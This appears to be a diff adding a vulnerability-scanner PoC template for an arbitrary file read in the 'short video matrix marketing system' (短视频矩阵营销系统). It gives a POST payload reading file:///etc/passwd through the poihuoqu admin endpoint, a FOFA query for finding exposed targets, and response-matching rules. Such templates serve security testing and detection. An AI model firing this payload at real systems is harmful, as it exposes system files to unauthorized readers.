@@ -1,0 +1,19 @@
+id: poc-yaml-short-video-matrix-poihuoqu-anyfile-read
+info:
+  name: 短视频矩阵营销系统 poihuoqu 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 短视频矩阵营销系统
+  fofa: title="短视频矩阵营销系统"
+requests:
+- method: POST
+  path: /index.php/admin/Userinfo/poihuoqu
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: poi=file:///etc/passwd
+  expression: "status_code == 200 && \ncontains(body,\"root:\") &&\ncontains(body,\"\
+    /bin\") &&\ncontains(content_type,\"application/json\") &&\n!contains(body,\"\
+    <\")\n"
+variables: {}
+transport: http
